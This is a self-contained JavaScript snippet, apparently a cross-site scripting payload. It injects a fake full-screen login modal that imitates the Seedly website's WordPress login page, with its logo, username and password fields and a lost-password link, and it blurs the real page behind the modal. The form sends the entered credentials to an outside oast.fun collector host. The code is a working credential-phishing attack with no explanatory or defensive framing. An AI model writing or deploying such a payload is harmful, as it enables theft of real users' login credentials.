(function() {
  // Insert modal with exact Seedly login
  document.body.insertAdjacentHTML('beforeend', `
    <div id="custom-login-modal" style="position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.5);display:flex;justify-content:center;align-items:center;z-index:9999;">
      <div style="background:#fff;border:1px solid #ddd;max-width:350px;width:100%;padding:2rem;box-shadow:0 0 10px rgba(0,0,0,0.1);font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Helvetica,Arial,sans-serif;">
        <!-- Seedly Logo -->
        <div style="text-align:center;margin-bottom:1.5rem;">
          <img src="https://seedly.sg/wp-content/uploads/2020/07/Seedly-Logo-2020.png" alt="Seedly" style="height:40px;">
        </div>

        <!-- Title -->
        <h2 style="text-align:center;margin-bottom:1rem;color:#333;font-size:1.5rem;">Log In</h2>

        <!-- Form -->
        <form action="https://abzfdgjdobpnrmlcfsqo5jrtg5ghq5wu6.oast.fun" method="POST">
          <p>
            <label for="user_login">Username or Email Address</label>
            <input type="text" name="log" id="user_login" class="input" value="" size="20" placeholder="Username or Email" style="width:100%;padding:0.75rem;border:1px solid #ddd;border-radius:4px;font-size:1rem;box-sizing:border-box;">
          </p>
          <p>
            <label for="user_pass">Password</label>
            <input type="password" name="pwd" id="user_pass" class="input" value="" size="20" placeholder="Password" style="width:100%;padding:0.75rem;border:1px solid #ddd;border-radius:4px;font-size:1rem;box-sizing:border-box;">
          </p>
          <p style="margin-bottom:1rem;">
            <label><input name="rememberme" type="checkbox" id="rememberme" value="forever" style="margin-right:0.5rem;"> Remember Me</label>
          </p>
          <p>
            <input type="submit" name="wp-submit" id="wp-submit" class="button button-primary" value="Log In" style="width:100%;padding:0.75rem;background:#0073aa;color:#fff;border:none;border-radius:4px;font-size:1rem;cursor:pointer;">
            <input type="hidden" name="redirect_to" value="https://seedly.sg/">
            <input type="hidden" name="testcookie" value="1">
          </p>
        </form>

        <!-- Links -->
        <p style="text-align:center;margin-top:1rem;font-size:0.9rem;color:#666;">
          <a href="https://seedly.sg/wp-login.php?action=lostpassword" style="color:#0073aa;text-decoration:none;">Lost your password?</a>
        </p>
      </div>
    </div>
  `);

  // Blur background
  const pageContent = document.body;
  if (pageContent) {
    pageContent.style.transition = 'filter 0.3s ease';
    pageContent.style.filter = 'blur(5px)';
  }

  // Close modal on click outside or Escape key
  const modal = document.getElementById('custom-login-modal');
  modal.addEventListener('click', (e) => {
    if (e.target.id === 'custom-login-modal') {
      modal.remove();
      if (pageContent) pageContent.style.filter = 'none';
    }
  });

  document.addEventListener('keydown', (e) => {
    if (e.key === 'Escape') {
      if (modal) {
        modal.remove();
        if (pageContent) pageContent.style.filter = 'none';
      }
    }
  });
})();
